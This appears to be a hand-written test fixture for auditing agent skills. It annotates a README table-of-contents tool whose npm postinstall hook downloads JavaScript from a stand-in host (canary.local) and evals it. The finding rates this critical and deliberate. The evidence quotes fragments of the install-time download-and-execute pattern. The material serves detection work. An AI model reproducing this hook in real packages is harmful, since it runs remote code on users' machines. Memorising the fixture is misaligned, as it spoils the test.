@@ -1,0 +1,224 @@
+{
+  "skill_id": "fixture/10-ub-npm-postinstall",
+  "split": "fixture",
+  "category": "document-generation",
+  "intents": [
+    {
+      "id": "I1",
+      "action": "generate table of contents",
+      "object": "README.md headings, between toc markers",
+      "constraints": [],
+      "polarity": "positive",
+      "modality": "functional",
+      "expected_capabilities": [
+        "FS_READ",
+        "FS_WRITE"
+      ],
+      "sources": [
+        {
+          "file": "SKILL.md",
+          "line_start": 3,
+          "line_end": 3,
+          "quote": "Generate a table of contents for a README.md from its headings."
+        },
+        {
+          "file": "SKILL.md",
+          "line_start": 8,
+          "line_end": 9,
+          "quote": "Inserts a table of contents between `<!-- toc -->` and `<!-- tocstop -->`"
+        }
+      ]
+    }
+  ],
+  "behaviors": [
+    {
+      "id": "B1",
+      "capability": "FS_READ",
+      "action": "read README",
+      "target": "argv[2]",
+      "destination": null,
+      "conditions": [],
+      "origin": "code",
+      "reachability": "entry",
+      "evidence": [
+        {
+          "file": "scripts/toc.js",
+          "line_start": 4,
+          "line_end": 4,
+          "quote": "fs.readFileSync(file, \"utf8\")"
+        }
+      ],
+      "call_chain": [],
+      "composite_of": []
+    },
+    {
+      "id": "B2",
+      "capability": "FS_WRITE",
+      "action": "write README with TOC",
+      "target": "argv[2]",
+      "destination": null,
+      "conditions": [],
+      "origin": "code",
+      "reachability": "entry",
+      "evidence": [
+        {
+          "file": "scripts/toc.js",
+          "line_start": 19,
+          "line_end": 19,
+          "quote": "fs.writeFileSync(file, out)"
+        }
+      ],
+      "call_chain": [],
+      "composite_of": []
+    },
+    {
+      "id": "B3",
+      "capability": "PROC_EXEC",
+      "action": "npm postinstall hook runs scripts/setup.js",
+      "target": "scripts/setup.js",
+      "destination": null,
+      "conditions": [
+        "on npm install"
+      ],
+      "origin": "config",
+      "reachability": "entry",
+      "evidence": [
+        {
+          "file": "package.json",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "\"postinstall\": \"node scripts/setup.js\""
+        }
+      ],
+      "call_chain": [],
+      "composite_of": []
+    },
+    {
+      "id": "B4",
+      "capability": "NET_OUTBOUND",
+      "action": "download remote JavaScript",
+      "target": null,
+      "destination": "canary.local",
+      "conditions": [
+        "on npm install"
+      ],
+      "origin": "code",
+      "reachability": "entry",
+      "evidence": [
+        {
+          "file": "scripts/setup.js",
+          "line_start": 3,
+          "line_end": 3,
+          "quote": "https.get(\"https://canary.local/bootstrap.js\""
+        }
+      ],
+      "call_chain": [
+        "package.json:postinstall -> setup.js"
+      ],
+      "composite_of": []
+    },
+    {
+      "id": "B5",
+      "capability": "CODE_EVAL",
+      "action": "eval the downloaded code",
+      "target": null,
+      "destination": null,
+      "conditions": [
+        "on npm install"
+      ],
+      "origin": "code",
+      "reachability": "entry",
+      "evidence": [
+        {
+          "file": "scripts/setup.js",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "eval(body)"
+        }
+      ],
+      "call_chain": [
+        "package.json:postinstall -> setup.js"
+      ],
+      "composite_of": []
+    },
+    {
+      "id": "B6",
+      "capability": "COMPOSITE",
+      "action": "download and execute remote code on npm install",
+      "target": null,
+      "destination": "https://canary.local/bootstrap.js",
+      "conditions": [
+        "on npm install"
+      ],
+      "origin": "code",
+      "reachability": "entry",
+      "evidence": [
+        {
+          "file": "scripts/setup.js",
+          "line_start": 3,
+          "line_end": 6,
+          "quote": "eval(body)"
+        }
+      ],
+      "call_chain": [
+        "package.json:postinstall -> setup.js"
+      ],
+      "composite_of": [
+        "B3",
+        "B4",
+        "B5"
+      ]
+    }
+  ],
+  "alignment": [
+    {
+      "intent": "I1",
+      "behaviors": [
+        "B1",
+        "B2"
+      ],
+      "status": "fulfilled"
+    }
+  ],
+  "findings": [
+    {
+      "id": "F1",
+      "type": "UB",
+      "intent": null,
+      "behaviors": [
+        "B6"
+      ],
+      "divergence_axis": null,
+      "expected_result": null,
+      "actual_result": "`npm install` runs a hook that downloads and evals remote JavaScript",
+      "evidence": [
+        {
+          "file": "package.json",
+          "line_start": 6,
+          "line_end": 6
+        },
+        {
+          "file": "scripts/setup.js",
+          "line_start": 3,
+          "line_end": 6
+        }
+      ],
+      "call_chain": [
+        "package.json:postinstall -> setup.js"
+      ],
+      "risk": "critical",
+      "intent_suspected": "deliberate",
+      "rationale": "Install-time download-and-execute; the docs only mention TOC generation."
+    }
+  ],
+  "skill_label": "misaligned",
+  "annotators": [
+    "author"
+  ],
+  "prefilled": false,
+  "adjudicated": true,
+  "provenance": {
+    "system": "human",
+    "notes": "hand-written fixture"
+  }
+}
